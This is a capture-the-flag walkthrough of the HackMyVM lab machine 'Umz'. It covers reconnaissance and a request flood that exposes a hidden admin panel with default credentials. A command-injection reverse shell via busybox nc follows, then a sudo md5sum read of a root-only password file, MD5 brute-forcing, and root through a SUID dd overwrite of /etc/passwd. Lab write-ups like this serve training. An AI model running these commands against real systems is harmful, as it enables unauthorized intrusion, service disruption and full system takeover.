# Umz

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.42:22
Open 10.0.2.42:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.42

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: cyber fortress 9000
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

There's `index.html` and `index.php`

![writeup.png](/assets/pentest/hackmyvm/umz/writeup.png)

![writeup-1.png](/assets/pentest/hackmyvm/umz/writeup-1.png)

### Fuzzing

Nothing else from fuzzing
```bash
└─$ feroxbuster -u http://umz.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --thorough -D -C 404,400,403,500 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html
```

No CVEs against server
```bash
└─$ nuclei -u http://umz.hmv
[WRN] Found 1 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v3.4.10 (latest)
[INF] Current nuclei-templates version: v10.2.8 (latest)
[INF] New templates added in latest release: 114
[INF] Templates loaded for current scan: 8323
[INF] Executing 8121 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 202 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1782 (Reduced 1676 Requests)
[INF] Using Interactsh Server: oast.pro
[external-service-interaction] [http] [info] http://umz.hmv
[waf-detect:apachegeneric] [http] [info] http://umz.hmv
[openssh-detect] [tcp] [info] umz.hmv:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"]
[ssh-auth-methods] [javascript] [info] umz.hmv:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] umz.hmv:22
[ssh-sha1-hmac-algo] [javascript] [info] umz.hmv:22
[ssh-server-enumeration] [javascript] [info] umz.hmv:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"]
[http-missing-security-headers:permissions-policy] [http] [info] http://umz.hmv
[http-missing-security-headers:x-frame-options] [http] [info] http://umz.hmv
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://umz.hmv
[http-missing-security-headers:clear-site-data] [http] [info] http://umz.hmv
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://umz.hmv
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://umz.hmv
[http-missing-security-headers:strict-transport-security] [http] [info] http://umz.hmv
[http-missing-security-headers:content-security-policy] [http] [info] http://umz.hmv
[http-missing-security-headers:x-content-type-options] [http] [info] http://umz.hmv
[http-missing-security-headers:referrer-policy] [http] [info] http://umz.hmv
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://umz.hmv
[options-method] [http] [info] http://umz.hmv ["GET,POST,OPTIONS,HEAD"]
[apache-detect] [http] [info] http://umz.hmv ["Apache/2.4.62 (Debian)"]
[caa-fingerprint] [dns] [info] umz.hmv
[INF] Scan completed in 1m. 21 matches found.
```

Website talks about stress testing, but there's no form or anything. If we ad to guess there's a hidden parameter which performs actions
```bash
└─$ cewl http://umz.hmv/index.php -w cewl.txt --with-numbers --lowercase -a
└─$ ffuf -u 'http://umz.hmv/index.php?FUZZ=1' -w cewl.txt -mc all -fs 2714
stress                  [Status: 200, Size: 2707, Words: 909, Lines: 94, Duration: 3686ms]
```

Stress parameter changes prime count element value
```bash
└─$ curl 'http://umz.hmv/index.php?stress=1' -s | grep '>1<'
                <span class="prime-count">1</span>

└─$ curl 'http://umz.hmv/index.php?stress=1000' -s | grep '>1000<'
                <span class="prime-count">1000</span>
```

### Mini DDOS

Using ffuf we can overload the server and essentially cause DDOS
```bash
└─$ ffuf -u 'http://umz.hmv/index.php?stress=FUZZ' -w <(seq 1 10000 100000000) -mc all -timeout 1 -ignore-body -c -maxtime 1 -t 200
[WARN] Maximum running time for entire process reached, exiting.
```

Something interesting happens when we do this... HTTP port closes and port 8080 opens up

```bash
└─$ nmap -p- -T5 10.0.2.42
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

## HTTP (8080)

![writeup-2.png](/assets/pentest/hackmyvm/umz/writeup-2.png)

Try `admin:admin` just in case, and it works

![writeup-3.png](/assets/pentest/hackmyvm/umz/writeup-3.png)

### Reverse Shell

```bash
localhost; busybox nc 10.0.2.15 4444 -e /bin/bash 
```

```bash
└─$ listen
Ncat: Connection from 10.0.2.42:58516.
script /dev/null -qc /bin/bash
welcome@Umz:/root$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

## SSH (welcome)

Upgrade reverse shell to SSH session

```bash
└─$ ssh-keygen -f id_rsa -q -P x
└─$ cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJIYozJv+khEVAs6AmkW+paxQKsf5MUESh4E9O2tt+N woyag@kraken

welcome@Umz:~$ mkdir ~/.ssh
welcome@Umz:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJIYozJv+khEVAs6AmkW+paxQKsf5MUESh4E9O2tt+N woyag@kraken' > ~/.ssh/authorized_keys

└─$ ssh -i id_rsa welcome@umz.hmv
welcome@Umz:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

### User.txt

```bash
welcome@Umz:~$ cat user.txt
flag{user-4483f72525b3c316704cf126bec02d5c}
```

## Privilege Escalation (umzyyds)

We have `md5sum` as `sudo`, kinda useless
```bash
welcome@Umz:~$ sudo -l
Matching Defaults entries for welcome on Umz:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Umz:
    (ALL) NOPASSWD: /usr/bin/md5sum
```

However there's a file called `umz.pass` in `/opt/flask-debug`. It's not globally readable, we can use `md5sum` here and then crack it.
```bash
welcome@Umz:/opt/flask-debug$ ls -Alh
total 12K
-rw-r--r-- 1 root root 4.9K May  3 10:23 flask_debug.py
-rwx------ 1 root root   10 May  3 10:32 umz.pass

welcome@Umz:/opt/flask-debug$ sudo md5sum /opt/flask-debug/umz.pass
a963fadd7fd379f9bc294ad0ba44f659  /opt/flask-debug/umz.pass
```

Nothing from john
```bash
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
```

```bash
#!/bin/bash

WORDLIST="$1"
TARGET="$2"

COUNT=0
while IFS= read -r line; do
    ((COUNT++))
    HASH=$(echo "$line" | md5sum | awk '{print $1}')
    printf "\r[+] #%d: %s -> %s" "$COUNT" "$line" "$HASH"
    if [[ "$HASH" == "$TARGET" ]]; then
        echo -e "\n\033[32m[+] Match found!\033[0m"
        echo -e "   Word: \033[33m$line\033[0m"
        exit 0
    fi
done < "$WORDLIST"

echo -e "\n\033[31m[-] No match found in file.\033[0m"
exit 1
```

```bash
└─$ ./brute.sh $rockyou a963fadd7fd379f9bc294ad0ba44f659
[+] #9981: sunshine3 -> a963fadd7fd379f9bc294ad0ba44f6592d0226818
[+] Match found!
   Word: sunshine3
```

## Privilege Escalation (root)

```bash
└─$ sshpass -p 'sunshine3' ssh umzyyds@umz.hmv
umzyyds@Umz:~$ id
uid=1001(umzyyds) gid=1001(umzyyds) groups=1001(umzyyds)
umzyyds@Umz:~$ sudo -l
Sorry, user umzyyds may not run sudo on Umz.
```

There's a SUID binary in CWD
```bash
umzyyds@Umz:~$ find . -type f -ls
   527370      4 -rw-r--r--   1 umzyyds  umzyyds       220 May  3 10:27 ./.bash_logout
   527371      4 -rw-r--r--   1 umzyyds  umzyyds      3526 May  3 10:27 ./.bashrc
   527372      4 -rw-r--r--   1 umzyyds  umzyyds       807 May  3 10:27 ./.profile
   527400     76 -rwsr-sr-x   1 root     root        76712 May  3 10:42 ./Dashazi
```

It's just `dd`
```bash
umzyyds@Umz:~$ ./Dashazi  --help
Usage: ./Dashazi [OPERAND]...
  or:  ./Dashazi OPTION
Copy a file, converting and formatting according to the operands.

  bs=BYTES        read and write up to BYTES bytes at a time (default: 512);
                  overrides ibs and obs
  cbs=BYTES       convert BYTES bytes at a time
  conv=CONVS      convert the file as per the comma separated symbol list

umzyyds@Umz:~$ md5sum Dashazi /bin/dd
1f90de0a1b75febeda1936a1ed9e1066  Dashazi
1f90de0a1b75febeda1936a1ed9e1066  /bin/dd
```

[https://gtfobins.github.io/gtfobins/dd](https://gtfobins.github.io/gtfobins/dd)

```bash
umzyyds@Umz:~$ cp /etc/passwd .
umzyyds@Umz:~$ echo "pwn:$(openssl passwd -6 -salt y x):0:0:root:/root:/bin/bash" >> ./passwd
umzyyds@Umz:~$ cat passwd | ./Dashazi of=/etc/passwd
umzyyds@Umz:~$ su pwn
Password: x
root@Umz:/home/umzyyds# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@Umz:/home/umzyyds# cat /root/root.txt
flag{root-a73c45107081c08dd4560206b8ef8205}
```